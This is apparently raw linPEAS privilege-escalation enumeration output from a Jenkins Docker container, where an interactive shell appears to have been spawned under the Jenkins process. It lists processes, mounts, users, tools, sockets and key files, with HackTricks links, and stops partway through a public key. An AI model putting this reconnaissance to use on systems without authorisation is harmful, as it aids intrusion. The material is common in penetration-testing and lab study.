[1;31m/dev/[0mmapper/ubuntu--vg-ubuntu--lv on /etc/hosts type ext4 (rw,relatime,data=ordered)
proc on /proc/bus type proc (ro,relatime)
proc on /proc/fs type proc (ro,relatime)
proc on /proc/irq type proc (ro,relatime)
proc on /proc/sys type proc (ro,relatime)
proc on /proc/sysrq-trigger type proc (ro,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)

[1;34m╔══════════╣ [1;32mPossible Entrypoints
[0m-rwxr-xr-x 1 jenkins jenkins 829K Aug 27 04:28 /tmp/linpeas.sh



[1;34m                                     ╔═══════╗
═════════════════════════════════════╣ [1;32mCloud[1;34m ╠═════════════════════════════════════
[1;34m                                     ╚═══════╝[0m
[1;34m═╣ [1;32mGoogle Cloud Platform? ............... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS ECS? ............................. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS EC2? ............................. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS EC2 Beanstalk? ................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS Lambda? .......................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS Codebuild? ....................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mDO Droplet? .......................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mIBM Cloud VM? ........................ [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAzure VM? ............................ [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAzure APP? ........................... [1;32mNo[0m
[0m[0m


[1;34m                ╔════════════════════════════════════════════════╗
════════════════╣ [1;32mProcesses, Crons, Timers, Services and Sockets[1;34m ╠════════════════
[1;34m                ╚════════════════════════════════════════════════╝[0m
[1;34m╔══════════╣ [1;32mCleaned processes
[0m[1;34m╚ [1;34m[3mCheck weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
[0m[1;96m[1;95mjenkins[0m[0m      1  0.0  0.0   1148     4 ?        Ss   21:08   0:00 /sbin/tini -- /usr/local/[1;34mbin[0m/jenkins.sh
[1;96m[1;95mjenkins[0m[0m      6  7.5 18.2 2632984 371148 ?      Sl   21:08   4:51 [1;32mjava[0m -Duser.home=[1;31m/var/jenkins_home[0m -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war
[1;96m[1;95mjenkins[0m[0m    120  0.0  0.0   4280   760 ?        S    21:30   0:00  _ sh
[1;96m[1;95mjenkins[0m[0m    124  0.0  0.1  20680  2208 ?        S    21:32   0:00  |   _ script -q /dev/null /[1;34mbin[0m/bash
[1;96m[1;95mjenkins[0m[0m    125  0.0  0.0   4280  1408 pts/0    Ss+  21:32   0:00  |       _ sh -i
[1;96m[1;95mjenkins[0m[0m   3236  0.0  0.0   4280   712 ?        S    22:09   0:00  _ sh
[1;96m[1;95mjenkins[0m[0m   3239  0.0  0.1   5100  2552 ?        S    22:10   0:00      _ /[1;34mbin[0m/sh ./linpeas.sh
[1;96m[1;95mjenkins[0m[0m  11752  0.0  0.0   5100  1024 ?        S    22:12   0:00          _ /[1;34mbin[0m/sh ./linpeas.sh
[1;96m[1;95mjenkins[0m[0m  11756  0.0  0.1  38384  3292 ?        R    22:12   0:00          |   _ ps faux[1;32mwww[0m
[1;96m[1;95mjenkins[0m[0m  11755  0.0  0.0   5100  1024 ?        S    22:12   0:00          _ /[1;34mbin[0m/sh ./linpeas.sh
[1;96m[1;95mjenkins[0m[0m   7161  0.0  0.0  91704   412 ?        Ss   22:11   0:00 gpg-agent --homedir [1;31m/var/jenkins_home[0m/.gnupg --use-standard-socket --[1;34m[1;32mdaemon[0m[0m

[1;34m╔══════════╣ [1;32mBinary processes permissions (non 'root root' and not belonging to current user)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
[0m
[1;34m╔══════════╣ [1;32mProcesses whose PPID belongs to a different user (not root)
[0m[1;34m╚ [1;34m[3mYou will know if a user can somehow spawn processes as a different user
[0m
[1;34m╔══════════╣ [1;32mFiles opened by processes belonging to other users
[0m[1;34m╚ [1;34m[3mThis is usually empty because of the lack of privileges to read other user processes information
[0m
[1;34m╔══════════╣ [1;32mProcesses with credentials in memory (root req)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
[0m[1;90mgdm-password Not Found
[0m[1;90mgnome-keyring-daemon Not Found
[0m[1;90mlightdm Not Found
[0m[1;90mvsftpd Not Found
[0m[1;90mapache2 Not Found
[0m[1;90msshd Not Found
[0m
[1;34m╔══════════╣ [1;32mCron jobs
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
[0m[1;90mcrontab Not Found
[0m[1;90mincrontab Not Found
[0m[1;32m[0m/[1;32m[0me[1;32m[0mt[1;32m[0mc[1;32m[0m/[1;32m[0mc[1;32m[0mr[1;32m[0mo[1;32m[0mn[1;32m[0m.[1;32m[0md[1;32m[0ma[1;32m[0mi[1;32m[0ml[1;32m[0my[1;32m[0m:[1;32m[0m
[1;32m[0mt[1;32m[0mo[1;32m[0mt[1;32m[0ma[1;32m[0ml[1;32m[0m [1;32m[0m2[1;32m[0m4[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m2[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mJ[1;32m[0ma[1;32m[0mn[1;32m[0m [1;32m[0m3[1;32m[0m0[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m0[1;32m[0m [1;32m[0m.[1;32m[0m
[1;32m[0md[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m4[1;32m[0m0[1;32m[0m9[1;32m[0m6[1;32m[0m [1;32m[0mA[1;32m[0mu[1;32m[0mg[1;32m[0m [1;32m[0m [1;32m[0m3[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m2[1;32m[0m0[1;32m[0m [1;32m[0m.[1;32m[0m.[1;32m[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m1[1;32m[0m4[1;32m[0m7[1;32m[0m4[1;32m[0m [1;32m[0mJ[1;32m[0ma[1;32m[0mn[1;32m[0m [1;32m[0m1[1;32m[0m8[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m1[1;32m[0m9[1;32m[0m [1;32mapt-compat[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m1[1;32m[0m5[1;32m[0m9[1;32m[0m7[1;32m[0m [1;32m[0mJ[1;32m[0mu[1;32m[0mn[1;32m[0m [1;32m[0m2[1;32m[0m6[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m1[1;32m[0m8[1;32m[0m [1;32mdpkg[0m
[1;32m[0m-[1;32m[0mr[1;32m[0mw[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0mr[1;32m[0m-[1;32m[0mx[1;32m[0m [1;32m[0m1[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0mr[1;32m[0mo[1;32m[0mo[1;32m[0mt[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m4[1;32m[0m9[1;32m[0m [1;32m[0mM[1;32m[0ma[1;32m[0my[1;32m[0m [1;32m[0m1[1;32m[0m7[1;32m[0m [1;32m[0m [1;32m[0m2[1;32m[0m0[1;32m[0m1[1;32m[0m7[1;32m[0m [1;32mpasswd[0m

[1;34m╔══════════╣ [1;32mSystemd PATH
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
[0m
[1;34m╔══════════╣ [1;32mAnalyzing .service files
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
[0m[1;32mYou can't write on systemd PATH[0m

[1;34m╔══════════╣ [1;32mSystem timers
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
[0m
[1;34m╔══════════╣ [1;32mAnalyzing .timer files
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
[0m
[1;34m╔══════════╣ [1;32mAnalyzing .socket files
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
[0m
[1;34m╔══════════╣ [1;32mUnix Sockets Listening
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
[0m[1;31m/var/jenkins_home/.gnupg/S.gpg-agent[0m
  └─([1;31mRead Write[0m)
[1;31m/var/jenkins_home/.gnupg/S.gpg-agent.browser[0m
  └─([1;31mRead Write[0m)
[1;31m/var/jenkins_home/.gnupg/S.gpg-agent.extra[0m
  └─([1;31mRead Write[0m)
[1;31m/var/jenkins_home/.gnupg/S.gpg-agent.ssh[0m
  └─([1;31mRead Write[0m)

[1;34m╔══════════╣ [1;32mD-Bus config files
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
[0m
[1;34m╔══════════╣ [1;32mD-Bus Service Objects list
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
[0m[1;90mbusctl Not Found
[0m

[1;34m                              ╔═════════════════════╗
══════════════════════════════╣ [1;32mNetwork Information[1;34m ╠══════════════════════════════
[1;34m                              ╚═════════════════════╝[0m
[1;34m╔══════════╣ [1;32mHostname, hosts and DNS
[0mjenkins
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.17.0.2	jenkins

nameserver 10.0.0.2
search eu-west-1.compute.internal

[1;34m╔══════════╣ [1;32mInterfaces
[0mdefault		0.0.0.0
loopback	127.0.0.0
link-local	169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

[1;34m╔══════════╣ [1;32mActive Ports
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
[0mtcp    LISTEN     0      50        *:50000                 *:*                   users:(("java",pid=6,fd=341))
tcp    LISTEN     0      50        *:8080                  *:*                   users:(("java",pid=6,fd=148))

[1;34m╔══════════╣ [1;32mCan I sniff with tcpdump?
[0m[1;90mNo
[0m


[1;34m                               ╔═══════════════════╗
═══════════════════════════════╣ [1;32mUsers Information[1;34m ╠═══════════════════════════════
[1;34m                               ╚═══════════════════╝[0m
[1;34m╔══════════╣ [1;32mMy user
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
[0muid=1000([1;96m[1;95mjenkins[0m[0m) gid=1000([1;96m[1;95mjenkins[0m[0m) groups=1000([1;96m[1;95mjenkins[0m[0m)

[1;34m╔══════════╣ [1;32mDo I have PGP keys?
[0m/usr/bin/gpg
[1;90mnetpgpkeys Not Found
[0m[1;90mnetpgp Not Found
[0m
[1;34m╔══════════╣ [1;32mChecking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
[0m
[1;34m╔══════════╣ [1;32mChecking sudo tokens
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
[0mptrace protection [1;32mis enabled[0m (1)

[1;34m╔══════════╣ [1;32mChecking Pkexec policy
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2
[0m
[1;34m╔══════════╣ [1;32mSuperusers
[0m[1;31mroot[0m:x:0:0:root:/root:/[1;34mbin[0m/bash

[1;34m╔══════════╣ [1;32mUsers with console
[0m[1;96m[1;95mjenkins[0m[0m:x:1000:1000::/var/jenkins_home:/bin/bash
[1;31mroot[0m:x:0:0:root:/root:/bin/bash

[1;34m╔══════════╣ [1;32mAll users & groups
[0muid=0[1;31m([1;31mroot[0m)[0m gid=0[1;31m(root)[0m groups=0[1;31m(root)[0m
uid=1([1;34m[1;32mdaemon[0m[0m) gid=1([1;34m[1;32mdaemon[0m[0m) groups=1([1;34m[1;32mdaemon[0m[0m)
uid=10([1;34muucp[0m) gid=10([1;34muucp[0m) groups=10([1;34muucp[0m)
uid=100([1;34m_apt[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=1000([1;96m[1;95mjenkins[0m[0m) gid=1000([1;96m[1;95mjenkins[0m[0m) groups=1000([1;96m[1;95mjenkins[0m[0m)
uid=13([1;34mproxy[0m) gid=13([1;34mproxy[0m) groups=13([1;34mproxy[0m)
uid=2([1;34mbin[0m) gid=2([1;34mbin[0m) groups=2([1;34mbin[0m)
uid=3([1;34msys[0m) gid=3([1;34msys[0m) groups=3([1;34msys[0m)
uid=33([1;34m[1;32mwww-data[0m[0m) gid=33([1;34m[1;32mwww-data[0m[0m) groups=33([1;34m[1;32mwww-data[0m[0m)
uid=34([1;34mbackup[0m) gid=34([1;34mbackup[0m) groups=34([1;34mbackup[0m)
uid=38([1;34mlist[0m) gid=38([1;34mlist[0m) groups=38([1;34mlist[0m)
uid=39([1;34mirc[0m) gid=39([1;34mirc[0m) groups=39([1;34mirc[0m)
uid=4([1;34msync[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=41([1;34mgnats[0m) gid=41([1;34mgnats[0m) groups=41([1;34mgnats[0m)
uid=5([1;34mgames[0m) gid=60([1;34mgames[0m) groups=60([1;34mgames[0m)
uid=6([1;34mman[0m) gid=12([1;34mman[0m) groups=12([1;34mman[0m)
uid=65534([1;34m[1;32mnobody[0m[0m) gid=65534[1;32m(nogroup)[0m groups=65534[1;32m(nogroup)[0m
uid=7([1;34mlp[0m) gid=7([1;34mlp[0m) groups=7([1;34mlp[0m)
uid=8([1;34m[1;32mmail[0m[0m) gid=8([1;34m[1;32mmail[0m[0m) groups=8([1;34m[1;32mmail[0m[0m)
uid=9([1;34mnews[0m) gid=9([1;34mnews[0m) groups=9([1;34mnews[0m)

[1;34m╔══════════╣ [1;32mLogin now
[0m 22:12:23 up  1:04,  0 users,  load average: 0.25, 0.16, 0.42
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

[1;34m╔══════════╣ [1;32mLast logons
[0m
wtmp begins Mon Aug  3 03:03:59 2020

[1;34m╔══════════╣ [1;32mLast time logon each user
[0mUsername         Port     From             Latest

[1;34m╔══════════╣ [1;32mDo not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
[0m
[0m[1;34m╔══════════╣ [1;32mDo not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
[0m
[0m

[1;34m                             ╔══════════════════════╗
═════════════════════════════╣ [1;32mSoftware Information[1;34m ╠═════════════════════════════
[1;34m                             ╚══════════════════════╝[0m
[1;34m╔══════════╣ [1;32mUseful software
[0m/usr/bin/base64
/usr/bin/curl
/usr/bin/perl
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/wget

[1;34m╔══════════╣ [1;32mInstalled Compilers
[0m

[1;34m╔══════════╣ [1;32mAnalyzing Ldap Files (limit 70)
[0mThe password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Feb  2  2020 /etc/[1;31mldap[0m

drwxr-xr-x 4 jenkins jenkins 4096 Aug  3  2020 /var/jenkins_home/plugins/[1;31mldap[0m

drwxr-xr-x 2 jenkins jenkins 4096 Aug  3  2020 /var/jenkins_home/plugins/ldap/META-INF/maven/org.jenkins-ci.plugins/[1;31mldap[0m


[1;34m╔══════════╣ [1;32mSearching ssl/ssh files
[0m[1;34m══╣ [1;32mSome certificates were found (out limited):
[0m/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/CFCA_EV_ROOT.pem
/etc/ssl/certs/COMODO_Certification_Authority.pem
/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem
3239PSTORAGE_CERTSBIN


Searching inside /etc/ssh/ssh_config for interesting info
[1;31mHost[0m *
    SendEnv LANG LC_*
    HashKnown[1;31mHost[0ms yes
    GSSAPIAuthentication yes

[1;34m╔══════════╣ [1;32mAnalyzing PAM Auth Files (limit 70)
[0mdrwxr-xr-x 2 root root 4096 Jan 30  2020 /etc/[1;31mpam.d[0m




[1;34m╔══════════╣ [1;32mAnalyzing Keyring Files (limit 70)
[0mdrwxr-xr-x 2 root root 4096 Jan 30  2020 /usr/share/[1;31mkeyrings[0m




[1;34m╔══════════╣ [1;32mSearching uncommon passwd files (splunk)
[0mpasswd file: [1;31m/etc/pam.d/passwd[0m
passwd file: [1;31m/etc/passwd[0m
passwd file: [1;31m/usr/share/lintian/overrides/passwd[0m

[1;34m╔══════════╣ [1;32mAnalyzing PGP-GPG Files (limit 70)
[0m/usr/bin/gpg
[1;90mnetpgpkeys Not Found
[0m[1;90mnetpgp Not Found
[0m
-rw-r--r-- 1 root root 2825 Jul 28  2020 /etc/apt/trusted[1;31m.gpg[0m
-rw-r--r-- 1 root root 8176 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic[1;31m.gpg[0m
-rw-r--r-- 1 root root 8185 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic[1;31m.gpg[0m
-rw-r--r-- 1 root root 2344 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-stable[1;31m.gpg[0m
-rw-r--r-- 1 root root 5138 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic[1;31m.gpg[0m
-rw-r--r-- 1 root root 5147 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic[1;31m.gpg[0m
-rw-r--r-- 1 root root 2775 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable[1;31m.gpg[0m
-rw-r--r-- 1 root root 7483 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic[1;31m.gpg[0m
-rw-r--r-- 1 root root 7492 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic[1;31m.gpg[0m
-rw-r--r-- 1 root root 2275 Jul  7  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable[1;31m.gpg[0m
-rw-r--r-- 1 root root 3452 Feb  7  2019 /usr/share/gnupg/distsigkey[1;31m.gpg[0m
-rw-r--r-- 1 root root 49015 Jul  7  2019 /usr/share/keyrings/debian-archive-keyring[1;31m.gpg[0m
-rw-r--r-- 1 root root 24169 Jul  7  2019 /usr/share/keyrings/debian-archive-removed-keys[1;31m.gpg[0m
-rw-rw-r-- 1 root root 7152 Jul 28  2020 /var/jenkins_home/tini_pub[1;31m.gpg[0m
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQINBFANDtsBEACpb69Ul0Ko7D4XxRIvPGnDMuGdocb8PxR+EGbnHe0uS2tCbsfj
TOoWWUrjufrWYxGlKNqOxbEhzFA2wSQ6VD6xROPQT5dAdKaGnSCiaUg7XTzcb9u3
a5Qbx99EDZWaYDNMnLZnIElDX+YmkkEyrrmjiML63m+1P88Bz7ag18hLkqpCiIVM
TMRfQluBJVvndX7Stzm35utugN+xeTQryjLx74CO6TUWyC7hAjvQhR5IdAk4H0oT
RsOKZ9OQmpO0CJ1XXpKkDdDc60WVrLp1jwq2M7fx/Nz+z13nTHa3fDw8j10+1k0+
c2HafM+GLR5CHlXVMqveWJrimII1ZILxRj/86fFCEC8ZhVW1ym4j+mqEENrzP4I7
L3OnyKLxNKIY9CFDhfzLhNAuNeuIp6KgynzuyxWnJO4q7m/B0zcRIBcjXPrpblIx
QlT3qQ/vFdcylDDSdbgtjD+9URG6bFR9PVlRTllBDPGQEK8vjV44pxLCenm/TzdB
Y4RlEePf+3y7wVrkjg+l4rIDH57Vl188RODuWVGeLZ3IYWqvRUnYxHmta27UH6zY
7FNN5p7H2VqP6v9GFhiHOCTKdUbQhOoPLmUTyBas0WsC8sXdwpTy3mJthzfUwgVN
2SIXPnndz7RcHwZtW1x9ZtVMDr6ll99kT63+sdZJHmUdlnDr+EGEd/L61QARAQAB
tCBUaG9tYXMgT3JvemNvIDx0aG9tYXNAb3JvemNvLmZyPokBHAQQAQIABgUCUA8L
RQAKCRBJYaTFxD1O6EKGB/0Y6xVDkvKFdTCTeaGnqzn2IUSC+JBSuVOQD5bxVkUs
9OmtalVNU+vN0nkcL1Apxr4Hz0DBXH1PktIGTNRI3zdkZ37mwJDmUafy7uUpZr4T
T7z4ppYn9V6zSCH3tp8GI0NI/1E7JtAjGTpIFwC8Cj1L07vjyGjH8C2kEexImsTB
ScPzkGVxl0BqL5FOuF+uSx8IyDo6WnvZMifkDkomEqxtl+gasgjsB/Vohs1VokJ3
JcJZ46KIsbhgD1ma/J0jn1kycsq5k00BpwNTfLporn9sSjbVUf0onldKDmDFY3k4
tSgKC0sGa4YGiogWVT7jZt8A3UWRrIG3T4lpru55vkKyiQI4BBMBAgAiBQJQDQ7b
AhsDBgsJCAcDAgYVCAIJCgsEFgIDAQIeAQIXgAAKCRCahBWdcAGk5WJgD/90NC3h
/s0Ztk2dDQOA4aAFCMBpt5q6nodfVQFUwGZTc4QqRRCgDrYCLHyQ7PX0cly46XRj
eShnuk6t//f2z62Vkq9W5fsXpEWImnHX7x/5/gh9AQ8lGK6vCQSnbPBNB8Q6Wjgn
O/nuktS2bIlWfEwOLa8V5S576P0F4+nbRnVkRowEkOOYxlqjeJUJW9IdmdLby+QP
n7LxVRvKEfh3JoO27yxvTq8K7a4Ptmwx8NO12QNZGo4uzwV1qZkt/w/wAPoBfZw+
GEBIxYXtPLaRG+HMeuK6mXMNQGqh3fyIvGgLaXnGgOM0xmxjSr105cFLlGwrCzar
Gsktr8XrvaWnGUwD1eebQswI0xydet6V1SGXXzNU2h8gMZ7HnI/bR2M7GXtaxDrR
UEDNtuIYtorJ+SjkK5Ka6XNMk05Q3EdOJeNKLpDPn7mWHTBiccW6WGJgTXoRfbn+
uG8PM3kGCxPcp3KT9dP+SUgHmTh4tcrw+AyxHOn4UNVQvscozUekcxjrmB1JHzJm
5fMpdULjcwU9gkyuN3GgQlcmOfOF/4o7qOTKudrQ5CgzVhMfr/lf1ehfNDPxMN7u
km3hLbs9kK/U2G6o2/uc+FQA2vucUxHOtvHYM0fLFSvE++7I2ZjH8qSgDPDfJpN+
tsVdTpxzCxdZbrN1zIsRgjZmoYN8tLvOSOZGxrkBDQRTM1XNAQgArFZl/nlHrvoz
chRGDHw6+3z4XczhOP6J949yljkkdKP2waQlG6Bb03J7lZ6G4mMVg4SEquWMJM/+
aOcTuJCpVPJgLUCv5xO01Clp1a9BHYxb9TOKZ1mMG1nF20YUJZHbTeO2cb4sZGxH
sfJHoDw4EouXSF5NIfH3Z/50kIYRJkl5WBjj3E06UbgguXw2x5iFoPfpBBlF4ucJ
rPLZo56nYf+PPu+fPJ7fxAyR0dyNrD9Z9AdYMrMzlaV/7lMsX/ZVM+Upya2fRAVH
D+/DqSPCy/14JDdOEif8VX/Jx1SSE5/P1K7ZohvBgLgLpeLzZHEkpuepQY4TF4I8
baW65afJBwARAQABiQNEBBgBAgAPBQJTM1XNAhsCBQkDwmcAASkJEJqEFZ1wAaTl
wF0gBBkBAgAGBQJTM1XNAAoJECqK4Nq/8uWmyHMIAKdDGd3BctlhbCJc6Ji+ZQhT
2Y8rKdRba99PBoikUEhieosCNWw+ynB/HvNgKgy1D5Qr134mHK2zy8Jo/Akc+oIK
sFs//L0rbNF1wMDUNhb9y65vByy3KmY7oSHqILrFHFrkgdmiArpT5Oup/8QZ8j9j
+xzcoFVhJ0uSeABJ1WvlNCW1Uf0uzENSjsFrfzYKLSD9WYqRSG39oVGQR+8yuuM4
0QZvILCTaFm7ArVoTpjB6re1vOsHI4XjCogh7p7WnA/PuVyGgZibtcnu5ySlsaKV
miO+72u7FsaXy2Ktj8GPRRliMBIM0JxddEy+uLYVmEPJYwyh5EuPszDzGl5aOvs2
Gg//YADXocfBGN89Cjl8Nd7t4Zch5vBaFuvWcBhC0vY8cV4cb+KYRWjNx+0Q0221
XCr8lx+PKIhwoDSeIZmauhAI7QdHNGztPzkhNZ9Zyf8epqiTqCYuHpAnp1oLsT0y
x7TvNgznZLb9xLiix/NmPgkQLafzZW6or1+rNHnwYKQ+f2uyHCWMSQyAR9h9O8CT
+2byMAKlJ0fdsKlI/asvoUG2b5G4vzNsC5yDwEJpU+g6G2nffboxYKfEftB2IeXV
1PgOCarhSW5c6/IxljscjVyrhFdbl5cbmYbQBNCHUkiEglRoQ/N1oS0/ks5WooTj
bbQxUJZZqT/bs72YAWb6UEDl3w7wxZbYRGqnDJgxaD8NW9A/+kH8PrA7gOnsIwMw
uXUuzMdpv2hGjy9bZxY1VLqZD/nqOBLXSdF7yj9VBE593UN7qyTmT3KmTbLaILum
nuyKZ7cyyfONHR8pzGMIMBfVKimL1DOTKkzrpYc7jpRqafQZ4vs6FzCNyhRHMlzL
m57WN54qaZHsBN7GWATzusDie4xlqTW5XPSzoWxvV6RggoUQWrASmo2fIqAGu+0Y
DzKf1mnjAX7qW5ooyrCm3HSrU+Yxlpw30TrZd07IYFpVc+rn30XdHrTj3OjTihZY
xbuztXXRWf+mpGQHhuGFTNq2JQdZW5qaGlHxKWKBniRY8dm5Ag0EUA0O2wEQAMky
8GHJYQGguCL2c72GBtsvGIuMqei0rNGm7mbv2uGma2oQ3aTQA+ahF1RSsTZjyx1n
nnWNPRMTY7WPvSotX1zmm4rqrJXcFlv06BDzCrIIUWOYh09AASCcPcr3ZI6Hwy6W
olb74SzFKoMG3aJVsvLNC6SVsgk6DidUrxmCzAjJ7CIdV6HfGBwbEm1VvdCMpLPG
GPQZgzpfuajmuPPEQVXKIld3xkfv3LgUdSv60lATMlu9YAYkKU/H1zOH0OvDav5O
Cr7a/8SQCjJd2/fPu4KGH/2zfehC2ywnlNV8BsLTpCw+nnlEkKQZtOsFCBEHxdqJ
08mEb2whuFWCtF6OfmSYrkv/wAKeBtJTjM7U1Nqq4tkZkzMjslvH9B4bYNtWqNXo
